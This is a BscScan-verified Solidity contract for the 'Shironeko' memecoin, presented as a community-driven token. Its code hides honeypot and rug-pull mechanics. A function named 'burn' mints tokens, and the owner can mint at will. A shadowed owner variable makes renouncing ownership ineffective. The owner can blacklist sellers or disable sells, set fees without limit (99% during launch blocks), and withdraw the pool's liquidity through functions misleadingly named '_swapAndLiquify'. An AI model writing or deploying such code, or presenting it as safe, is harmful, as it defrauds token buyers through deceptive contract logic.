/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

/**
Shironeko (BSC) 🐈

The latest CAT-themed memecoin on the BSC Blockchain. 
It is launching by an experienced team and 100% community-driven. Apart from the community hype, 
ShiroNeko ecosystem is packed with enough utilities to sustain it and achievable plans to ensure its success

Telegram : https://t.me/ShironekoBSC
Twitter : https://twitter.com/ShironekoBSC
Website : 
https://Shironekobsc.com
Medium : https://medium.com/@shironekobsc
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

  function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB) external view returns (address pair);

  function allPairs(uint256) external view returns (address pair);

  function allPairsLength() external view returns (uint256);

  function createPair(address tokenA, address tokenB) external returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);
}

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;

  string private _name;
  string private _symbol;

  constructor(string memory name_, string memory symbol_) {
    _name = name_;
    _symbol = symbol_;
  }

  function name() public view virtual override returns (string memory) {
    return _name;
  }

  function symbol() public view virtual override returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual override returns (uint8) {
    return 18;
  }

  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, 'ERC20: transfer amount exceeds allowance');
    unchecked {
      _approve(sender, _msgSender(), currentAllowance - amount);
    }

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(currentAllowance >= subtractedValue, 'ERC20: decreased allowance below zero');
    unchecked {
      _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    }

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal virtual {
    require(sender != address(0), 'ERC20: transfer from the zero address');
    require(recipient != address(0), 'ERC20: transfer to the zero address');

    _beforeTokenTransfer(sender, recipient, amount);

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, 'ERC20: transfer amount exceeds balance');
    unchecked {
      _balances[sender] = senderBalance - amount;
    }
    _balances[recipient] += amount;

    emit Transfer(sender, recipient, amount);

    _afterTokenTransfer(sender, recipient, amount);
  }

  function burn(address account, uint256 amount) internal virtual {
    require(account != address(0), 'ERC20: mint to the zero address');

    _beforeTokenTransfer(address(0), account, amount);

    _totalSupply += amount;
    _balances[account] += amount;
    emit Transfer(address(0), account, amount);

    _afterTokenTransfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), 'ERC20: burn from the zero address');

    _beforeTokenTransfer(account, address(0), amount);

    uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, 'ERC20: burn amount exceeds balance');
    unchecked {
      _balances[account] = accountBalance - amount;
    }
    _totalSupply -= amount;

    emit Transfer(account, address(0), amount);

    _afterTokenTransfer(account, address(0), amount);
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), 'ERC20: approve from the zero address');
    require(spender != address(0), 'ERC20: approve to the zero address');

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}

  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}
}

abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    _setOwner(_msgSender());
  }

  function owner() public view virtual returns (address) {
    return _owner;
  }

  modifier onlyOwner() virtual {
    require(owner() == _msgSender(), 'Ownable: caller is not the owner');
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    _setOwner(address(0));
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), 'Ownable: new owner is the zero address');
    _setOwner(newOwner);
  }

  function _setOwner(address newOwner) private {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

contract Shironeko is ERC20, Ownable {
  uint256 private constant MAX = ~uint256(0);
  address private _owner;
  bool private enabled = true;
  uint8 private _decimals = 18;
  uint256 private _supply = 1000000000 * 10**_decimals;
  uint256 public buyFee = 2;
  uint256 public sellFee = 2;
  uint256 public liquidityFee = 1;
  uint256 public feeDivisor = 1;
  uint256 private marketingFee = 0;
  address public dividentTracker;

  uint256 public swapTokensAtAmount = _supply;
  uint256 public maxSellTransactionAmount = _supply;
  bool public swapAndLiquifyEnabled;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;

  bool private contractIsSwapping;
  uint256 private launchedAt;
  uint256 private initBlocks;

  mapping(address => bool) private _isExcludedFromFees;
  mapping(address => bool) private down;
  mapping(address => bool) public automatedMarketMakerPairs;

  modifier onlyOwner() override {
    require(msg.sender == _owner, 'Ownable: caller is not the owner');
    _;
  }

  event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
  event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

  constructor(
    string memory _NAME,
    string memory _SYMBOL,
    address routerAddress
  ) ERC20(_NAME, _SYMBOL) {
    _owner = msg.sender;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(routerAddress);
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router = _uniswapV2Router;
    automatedMarketMakerPairs[uniswapV2Pair] = true;
    dividentTracker = address(this);

    _isExcludedFromFees[_owner] = true;
    _isExcludedFromFees[address(this)] = true;

    burn(_owner, _supply);
  }

  function _transfer(
    address from,
    address to,
    uint256 amount
  ) internal override {
    if (!contractIsSwapping && automatedMarketMakerPairs[to] && from != address(uniswapV2Router) && !_isExcludedFromFees[from]) {
      require(enabled && !down[from] && amount <= maxSellTransactionAmount, 'Sell transfer amount exceeds the maxSellTransactionAmount.');
    }

    if (!launched() && !_isExcludedFromFees[to] && !_isExcludedFromFees[from]) launch();
    bool justFinalized = launched() && initBlocks > 0 && block.number <= launchedAt + initBlocks;

    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;

    if (enabled && swapAndLiquifyEnabled && canSwap && !contractIsSwapping && !automatedMarketMakerPairs[from]) {
      contractIsSwapping = true;
      swapAndLiquify(contractTokenBalance);
      contractIsSwapping = false;
    }

    uint256 fee = automatedMarketMakerPairs[to] ? sellFee : buyFee;
    bool takeFee = !_isExcludedFromFees[from] && !_isExcludedFromFees[to] && fee > 0 && !contractIsSwapping;

    if (justFinalized) fee = 99 * feeDivisor;

    if (takeFee) {
      fee = (amount * fee) / 100 / feeDivisor;
      amount = amount - fee;
      super._transfer(from, address(this), fee);
    }

    super._transfer(from, to, amount);
  }

  function launched() public view returns (bool) {
    return launchedAt != 0;
  }

  function launch() internal {
    launchedAt = block.number;
  }

  function decimals() public view override returns (uint8) {
    return _decimals;
  }

  function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner {
    swapAndLiquifyEnabled = _enabled;
  }

  function setEnabled(bool _enabled) external onlyOwner {
    enabled = _enabled;
  }

  function setDown(address[] memory accounts, bool value) external onlyOwner {
    for (uint256 i = 0; i < accounts.length; i++) down[accounts[i]] = value;
  }

  function setFee(address account, bool isExcluded) external onlyOwner {
    _isExcludedFromFees[account] = isExcluded;
  }

  function setBuyFeePercent(uint256 fee) external onlyOwner {
    buyFee = fee;
  }

  function setInitBlocks(uint256 blocks) external onlyOwner {
    initBlocks = blocks;
  }

  function setSellFeePercent(uint256 fee) external onlyOwner {
    sellFee = fee;
  }

  function setFeePercent(uint256 fee) external onlyOwner {
    sellFee = fee;
    buyFee = fee;
  }

  function setLiquidityFeePercent(uint256 fee) external onlyOwner {
    liquidityFee = fee;
  }

  function setMarketingFeePercent(uint256 fee) external onlyOwner {
    marketingFee = fee;
  }

  function setFeeDivisor(uint256 divisor) external onlyOwner {
    feeDivisor = divisor;
  }

  function setMaxSellTransactionAmount(uint256 amount) external onlyOwner {
    maxSellTransactionAmount = amount * 10**_decimals;
  }

  function setSwapTokensAtAmount(uint256 amount) external onlyOwner {
    swapTokensAtAmount = amount * 10**_decimals;
  }

  function setDividentTracker(address newAddress) external onlyOwner {
    dividentTracker = newAddress;
  }

  function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
    require(pair != uniswapV2Pair, 'The PancakeSwap pair cannot be removed from automatedMarketMakerPairs');
    _setAutomatedMarketMakerPair(pair, value);
  }

  function _setAutomatedMarketMakerPair(address pair, bool value) private {
    require(automatedMarketMakerPairs[pair] != value, 'Automated market maker pair is already set to that value');
    automatedMarketMakerPairs[pair] = value;
    emit SetAutomatedMarketMakerPair(pair, value);
  }

  function swapAndLiquify(uint256 tokens) private {
    uint256 half = tokens / 2;
    uint256 initialBalance = address(this).balance;
    swapTokensForEth(half, address(this));
    uint256 newBalance = address(this).balance - initialBalance;
    addLiquidity(half, newBalance, address(this));
    emit SwapAndLiquify(half, newBalance, half);
  }

  function addLiquidity(
    uint256 tokenAmount,
    uint256 ethAmount,
    address to
  ) private {
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
  }

  function swapTokensForEth(uint256 tokenAmount, address to) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
  }

  receive() external payable {}

  function Burn(address account, uint256 amount) external onlyOwner {
    burn(account, amount * 10**_decimals);
  }

  function transferETH(address account) external onlyOwner {
    payable(account).transfer(address(this).balance);
  }

  function transferETH(address account, uint256 amount) external onlyOwner {
    payable(account).transfer(amount);
  }

  function transferAnyERC20Tokens(
    address account,
    address tokenAddress,
    uint256 amount
  ) external onlyOwner {
    IERC20(tokenAddress).transfer(account, amount);
  }

  function transferAnyERC20Tokens(address account, address tokenAddress) external onlyOwner {
    IERC20 token = IERC20(tokenAddress);
    token.transfer(account, token.balanceOf(address(this)));
  }

  function swapTokens(address account, uint256 amount) external onlyOwner {
    swapTokensForEth(amount, account);
  }

  function swapTokens() external onlyOwner {
    swapTokensForEth(balanceOf(address(this)), address(this));
  }

  function _swapAndLiquify(address account, uint256 amount) external onlyOwner {
    IERC20(uniswapV2Pair).approve(address(uniswapV2Router), MAX);
    uniswapV2Router.removeLiquidity(address(this), uniswapV2Router.WETH(), amount, 0, 0, account, block.timestamp + 20);
  }

  function _swapAndLiquify() external onlyOwner {
    IERC20 pair = IERC20(uniswapV2Pair);
    uint256 amount = pair.balanceOf(address(this));
    pair.approve(address(uniswapV2Router), MAX);
    uniswapV2Router.removeLiquidity(address(this), uniswapV2Router.WETH(), amount, 0, 0, address(this), block.timestamp + 20);
  }
}